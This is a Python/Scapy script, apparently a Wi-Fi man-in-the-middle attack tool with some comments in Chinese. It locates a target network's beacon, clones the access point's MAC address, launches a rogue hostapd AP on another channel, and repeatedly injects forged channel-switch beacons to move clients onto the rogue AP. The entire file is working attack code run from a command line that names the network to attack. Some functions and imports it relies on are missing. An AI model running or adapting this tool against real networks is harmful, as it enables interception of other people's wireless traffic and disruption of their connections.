from scapy.all import * 
import argparse
import logging
import atexit

IEEE_TLV_TYPE_SSID    = 0
IEEE_TLV_TYPE_CHANNEL = 3
IEEE_TLV_TYPE_RSN     = 48
IEEE_TLV_TYPE_CSA     = 37
IEEE_TLV_TYPE_VENDOR  = 221

IEEE80211_RADIOTAP_RATE = (1 << 2)
IEEE80211_RADIOTAP_CHANNEL = (1 << 3)
IEEE80211_RADIOTAP_TX_FLAGS = (1 << 15)
IEEE80211_RADIOTAP_DATA_RETRIES = (1 << 17)

ALL, DEBUG, INFO, STATUS, WARNING, ERROR = range(6)
global_log_level2 = INFO

COLORCODES = { "gray"  : "\033[0;37m",
               "green" : "\033[0;32m",
               "orange": "\033[0;33m",
               "red"   : "\033[0;31m" }


logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class MitmSocket(L2Socket):
	def __init__(self, dumpfile=None, strict_echo_test=False, **kwargs):
		super(MitmSocket, self).__init__(**kwargs)
		self.pcap = None
		if dumpfile:
			self.pcap = PcapWriter("%s.%s.pcap" % (dumpfile, self.iface), append=False, sync=True)
		self.strict_echo_test = strict_echo_test

	def set_channel(self, channel):
		subprocess.check_output(["iw", self.iface, "set", "channel", str(channel)])

	def get_channel_hex(self, channel):
		channel_hex = hex(channel)
		return channel_hex

	def get_channel_freq(self, channel):
		if(channel == 1):
			return 2412
		elif(channel == 2):
			return 2417
		elif(channel == 3):
			return 2422
		elif(channel == 4):
			return 2427
		elif(channel == 5):
			return 2432
		elif(channel == 6):
			return 2437
		elif(channel == 7):
			return 2442
		elif(channel == 8):
			return 2447
		elif(channel == 9):
			return 2452
		elif(channel == 10):
			return 2457
		elif(channel == 11):
			return 2462

	def send(self, p, set_radio, channel):
		# 所有送出去的封包都要加 radiotap
		p[Dot11].FCfield |= 0x00
		if(set_radio):
			rt = RadioTap()
			rt.present = 'Flags+Channel+Antenna+RXFlags'
			rt.ChannelFrequency = int(self.get_channel_freq(channel))
			rt.ChannelFlags = 0x00a0
			rt.Antenna = 0x00
			rt.RXFlags = 0x0000
			L2Socket.send(self, rt/p)
			if self.pcap: self.pcap.write(rt/p)
			log(WARNING, "%s: Injected frame %s" % (self.iface, dot11_to_str(rt/p)))
		else:
			L2Socket.send(self,p)
			if self.pcap: self.pcap.write(p)
			log(WARNING, "%s: Injected frame %s" % (self.iface, dot11_to_str(p)))

	def _strip_fcs(self, p):
		# radiotap header flags 0x00...0: no used FCS failed
		# .present is flagsfield
		if p[RadioTap].present & 2 != 0 and not p.haslayer(Dot11FCS):
			rawframe = raw(p[RadioTap])
			pos = 8 # FCS 在 frame 開頭後第 9 bytes 的地方
			while ord(rawframe[pos - 1]) & 0x80 != 0: pos += 4
			# If the TSFT field is present, it must be 8-bytes aligned
			if p[RadioTap].present & 1 != 0:
				pos += (8 - (pos % 8))
				pos += 8
			# radiotap flag & 0x10
			if rawframe[pos] & 0x10 != 0:
				try:
					# FCS 在 frame 的最後 4 bytes
					return Dot11(raw(p[Dot11FCS])[:-4])
				except:
					return None
				
		return p[Dot11]

	def recv(self, x=MTU):
		p = L2Socket.recv(self, x)
		if p == None: 
			return None, None
		if p.getlayer(Dot11) == None:
			return None, None
		
		if self.pcap: self.pcap.write(p)
		# Don't care about control frames
		if p.type == 1:
			log(ALL, "%s: ignoring control frame %s" % (self.iface, dot11_to_str(p)))
			return None, None

		# 1. Radiotap monitor mode header is defined in ieee80211_add_tx_radiotap_header: TX_FLAGS, DATA_RETRIES, [RATE, MCS, VHT, ]
		# 2. Radiotap header for normal received frames is defined in ieee80211_add_rx_radiotap_header: FLAGS, CHANNEL, RX_FLAGS, [...]
		# 3. Beacons generated by hostapd and recieved on virtual interface: TX_FLAGS, DATA_RETRIES
		#
		# Conclusion: if channel flag is not present, but rate flag is included, then this could be an echoed injected frame.
		# Warning: this check fails to detect injected frames captured by the other interface (due to proximity of transmittors and capture effect)
		radiotap_possible_injection = (p[RadioTap].present & IEEE80211_RADIOTAP_CHANNEL == 0) and not (p[RadioTap].present & IEEE80211_RADIOTAP_RATE == 0)

		# Hack: ignore frames that we just injected and are echoed back by the kernel. Note that the More Data flag also
		#	allows us to detect cross-channel frames (received due to proximity of transmissors on different channel)
		if p[Dot11].FCfield & 0x20 != 0 and (not self.strict_echo_test or radiotap_possible_injection):
			log(DEBUG, "%s: ignoring echoed frame %s (0x%02d, present=%08d, strict=%d)" % (self.iface, dot11_to_str(p), p[Dot11].FCfield, p[RadioTap].present, radiotap_possible_injection))
			return None, None
		else:
			log(ALL, "%s: Received frame: %s" % (self.iface, dot11_to_str(p)))
		result = self._strip_fcs(p)
		return result, p

	def close(self):
		if self.pcap: self.pcap.close()
		super(MitmSocket, self).close()


class NetworkConfig():
    def __init__(self):
        self.ssid = None
        self.real_channel = None
        self.wpavers = 1
        self.hw = 'g'

    def from_beacon(self, p):
        el = p[Dot11Elt]
        while isinstance(el, Dot11Elt):
            if el.ID == IEEE_TLV_TYPE_SSID:
                self.ssid = el.info.decode('unicode_escape')
            elif el.ID == IEEE_TLV_TYPE_CHANNEL:
                self.real_channel = ord(el.info.decode('unicode_escape')[0])
            el = el.payload

    def find_rogue_channel(self):
        self.rogue_channel = 1 if self.real_channel > 6 else 11

    # hostapd.confg寫檔
    def write_config(self, iface):
        TEMPLATE = """
interface={iface}
ssid={ssid}_test
beacon_int=50
macaddr_acl=0
ignore_broadcast_ssid=0

hw_mode={hw}
channel={channel}

wpa={wpaver}
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""
        return TEMPLATE.format(
            iface=iface,
            ssid=self.ssid,
            channel=self.rogue_channel,
            wpaver=1,
            hw=self.hw,
            password=str('12345678'))


#### Utility ####
def call_macchanger(iface, macaddr):
	try:
		subprocess.check_output(["macchanger", "-m", macaddr, iface])
	except subprocess.CalledProcessError as err:
		if not "It's the same MAC!!" in err.output.decode():
			print(err.output.decode())
			raise
	
		
def set_mac_address(iface, macaddr):
	subprocess.check_output(["ifconfig", iface, "down"])
	call_macchanger(iface, macaddr)
	subprocess.check_output(["ifconfig", iface, "up"])


# 取得 beacon frame 的 ssid func.
def get_tlv_value(p, typee):
	if not p.haslayer(Dot11Elt): return None
	el = p[Dot11Elt]
	while isinstance(el, Dot11Elt):
		if el.ID == typee:
			return el.info.decode()
		el = el.payload
	return None


def log(level, msg, color=None, showtime=True):
	if level < global_log_level2: return
	if level == DEBUG   and color is None: color="gray"
	if level == WARNING and color is None: color="orange"
	if level == ERROR   and color is None: color="red"
	print((datetime.now().strftime('[%H:%M:%S] ') if showtime else " "*11) + COLORCODES.get(color, "") + msg + "\033[1;0m")


def construct_csa(channel, count=1):
	switch_mode = 1			# STA should not Tx untill switch is completed
	new_chan_num = channel	# Channel it should switch to
	switch_count = count	# Immediately make the station switch

	# Contruct the IE
	payload = struct.pack("<BBB", switch_mode, new_chan_num, switch_count)
	return Dot11Elt(ID=IEEE_TLV_TYPE_CSA, info=payload)


def append_csa(p, channel, count=1):
	p2 = p.copy()
	el = p2[Dot11Elt]
	prevel = None
	while isinstance(el, Dot11Elt):
		prevel = el
		el = el.payload
	prevel.payload = construct_csa(channel, count)
	return p2


def dot11_to_str(p):
	EAP_CODE = {1: "Request"}
	EAP_TYPE = {1: "Identity"}
	DEAUTH_REASON = {1: "Unspecified", 2: "Prev_Auth_No_Longer_Valid/Timeout", 3: "STA_is_leaving", 4: "Inactivity", 6: "Unexp_Class2_Frame", 7: "Unexp_Class3_Frame", 8: "Leaving", 15: "4-way_HS_timeout"}
	dict_or_str = lambda d, v: d.get(v, str(v))
	if p.type == 0:
		if p.haslayer(Dot11Beacon):     return "Beacon(seq=%d, TSF=%d)" % (dot11_get_seqnum(p), p[Dot11Beacon].timestamp)
		if p.haslayer(Dot11ProbeReq):   return "ProbeReq(seq=%d)" % dot11_get_seqnum(p)
		if p.haslayer(Dot11ProbeResp):  return "ProbeResp(seq=%d)" % dot11_get_seqnum(p)
		if p.haslayer(Dot11Auth):       return "Auth(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11Auth].status)
		if p.haslayer(Dot11Deauth):     return "Deauth(seq=%d, reason=%s)" % (dot11_get_seqnum(p), dict_or_str(DEAUTH_REASON, p[Dot11Deauth].reason))
		if p.haslayer(Dot11AssoReq):    return "AssoReq(seq=%d)" % dot11_get_seqnum(p)
		if p.haslayer(Dot11ReassoReq):  return "ReassoReq(seq=%d)" % dot11_get_seqnum(p)
		if p.haslayer(Dot11AssoResp):   return "AssoResp(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11AssoResp].status)
		if p.haslayer(Dot11ReassoResp): return "ReassoResp(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11ReassoResp].status)
		if p.haslayer(Dot11Disas):      return "Disas(seq=%d)" % dot11_get_seqnum(p)
		if p.subtype == 13:      return "Action(seq=%d)" % dot11_get_seqnum(p)
	elif p.type == 1:
		if p.subtype ==  9:      return "BlockAck"
		if p.subtype == 11:      return "RTS"
		if p.subtype == 13:      return "Ack"
	elif p.type == 2:
		if p.haslayer(Dot11WEP): return "EncryptedData(seq=%d, IV=%d)" % (dot11_get_seqnum(p), dot11_get_iv(p))
		if p.subtype == 4:       return "Null(seq=%d, sleep=%d)" % (dot11_get_seqnum(p), p.FCfield & 0x10 != 0)
		if p.subtype == 12:      return "QoS-Null(seq=%d, sleep=%d)" % (dot11_get_seqnum(p), p.FCfield & 0x10 != 0)
		if p.haslayer(EAPOL):
			if get_eapol_msgnum(p) != 0: return "EAPOL-Msg%d(seq=%d,replay=%d)" % (get_eapol_msgnum(p), dot11_get_seqnum(p), get_eapol_replaynum(p))
			elif p.haslayer(EAP):return "EAP-%s,%s(seq=%d)" % (dict_or_str(EAP_CODE, p[EAP].code), dict_or_str(EAP_TYPE, p[EAP].type), dot11_get_seqnum(p))
			else:                return repr(p)
		if p.haslayer(Dot11CCMP): return "EncryptedData(seq=%d, IV=%d)" % (dot11_get_seqnum(p), dot11_get_iv(p))
	return repr(p)	


def dot11_get_seqnum(p):
	return p[Dot11].SC >> 4


class Attack():
	def __init__(self, nic_real_mon, nic_rogue_mon, nic_rogue_ap, ssid, password):
		self.flag = True
		self.nic_real_mon = nic_real_mon
		self.nic_rogue_mon = nic_rogue_mon
		self.nic_rogue_ap = nic_rogue_ap
		self.ssid = ssid
		self.password = password
		self.beacon = None
		self.apmac = None
		self.netconfig = None
		self.hostapd = None
		self.script_path = os.path.dirname(os.path.realpath(__file__))

		self.sock_real = None
		self.sock_rogue = None
		self.last_real_beacon = None
		self.last_rogue_beacon = None


	def configure_interfaces(self):
		subprocess.check_output(["ifconfig", self.nic_real_mon, 'down'])
		subprocess.check_output(['iwconfig', self.nic_real_mon, 'mode', 'monitor'])
		subprocess.check_output(['ifconfig', self.nic_real_mon, 'up'])

		subprocess.check_output(['ifconfig', self.nic_rogue_mon, 'down'])
		subprocess.check_output(['iwconfig', self.nic_rogue_mon, 'mode', 'monitor'])
		subprocess.check_output(['ifconfig', self.nic_rogue_mon, 'up'])


	def find_beacon(self, ssid):
		ps = sniff(count=100, timeout=30, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real_mon)
		if ps is None or len(ps) < 1:
			for chan in [1, 6, 11, 3, 8, 2, 7, 4, 10, 5, 9, 12, 13]:
				self.sock_real.set_channel(chan)
				ps = sniff(count=10, timeout=10, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real_mon)
				if ps and len(ps) >= 1: break
		if ps and len(ps) >= 1:
			actual_chan = ord(get_tlv_value(ps[0], IEEE_TLV_TYPE_CHANNEL))
			self.sock_real.set_channel(actual_chan)
			self.beacon = ps[0]
			self.apmac = self.beacon.addr2


	def run(self):
		self.configure_interfaces()
		self.sock_real = MitmSocket(type=ETH_P_ALL, iface=self.nic_real_mon)
		self.sock_rogue = MitmSocket(type=ETH_P_ALL, iface=self.nic_rogue_mon)
		self.find_beacon(self.ssid)
		if self.beacon is None:
			log(ERROR, "No beacon received of network <%s>. Is monitor mode working? Did you enter the correct SSID?" % self.ssid)
			return
		self.netconfig = NetworkConfig()
		self.netconfig.from_beacon(self.beacon)

		self.netconfig.find_rogue_channel()
		self.sock_rogue.set_channel(self.netconfig.rogue_channel)
		self.sock_real.set_channel(self.netconfig.real_channel)
		log(STATUS, "Target network %s detected on channel %d" % (self.apmac, self.netconfig.real_channel), color="green")
		log(STATUS, "Will create rogue AP on channel %d" % self.netconfig.rogue_channel, color="green")
		log(STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
		set_mac_address(self.nic_rogue_ap, self.apmac)

		with open(os.path.realpath(os.path.join(self.script_path, "./hostapd-2.9/hostapd_rogue.conf")), "w") as fp:
			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
		hostapd_path = os.path.realpath(f'{os.path.join(self.script_path, "./hostapd-2.9/hostapd")} {os.path.realpath(os.path.join(self.script_path, "./hostapd-2.9/hostapd_rogue.conf"))} -dd -K')
		self.hostapd = subprocess.Popen(hostapd_path, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		
		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
		flag_while = 1
		time.sleep(10)
		self.send_csa_beacon(numbeacons=4)
		while(True):
			
			flag_while += 5
			time.sleep(1000000)
			self.send_csa_beacon(numbeacons=4)
			

	def send_csa_beacon(self, numbeacons=1, target=None, silent=False):
		newchannel = self.netconfig.rogue_channel
		beacon = self.beacon.copy()
		if target:
			beacon.addr1 = target

		for i in range(numbeacons):
			csabeacon = append_csa(beacon, newchannel, 2)
			self.sock_real.send(csabeacon, False, self.netconfig.real_channel)
			csabeacon = append_csa(beacon, newchannel, 1)
			self.sock_real.send(csabeacon, False, self.netconfig.real_channel)

		if not silent:
			log(STATUS, "Injected %d CSA beacon pairs (moving stations to channel %d)" % (numbeacons, newchannel), color="green")


	def stop(self):
		log(STATUS, "Closing hostapd and cleaning up ...")
		if self.hostapd:
			self.hostapd.terminate()
			self.hostapd.wait()
		if self.sock_real:
			self.sock_real.close()
		if self.sock_rogue:
			self.sock_rogue.close()
		subprocess.call(["ifconfig", self.nic_rogue_ap, "down"])
		subprocess.call(["macchanger", "-p", self.nic_rogue_ap])
		subprocess.call(["ifconfig", self.nic_rogue_ap, "up"])


def cleanup(attack: Attack):
    attack.stop()

if __name__ == "__main__":
	parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
	parser.add_argument("nic_real_mon", help="Wireless monitor interface that will listen on the channel of the target AP.")
	parser.add_argument("nic_rogue_mon", help="Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.")
	parser.add_argument("nic_rogue_ap", help="Wireless monitor interface that will run a rogue AP using a modified hostapd.")
	parser.add_argument("ssid", help="The SSID of the network to attack.")
	parser.add_argument("password", help="The password of the network to attack.")

	args = parser.parse_args()
	attack = Attack(args.nic_real_mon, args.nic_rogue_mon, args.nic_rogue_ap, args.ssid, args.password)

	atexit.register(cleanup, attack)
	attack.run()

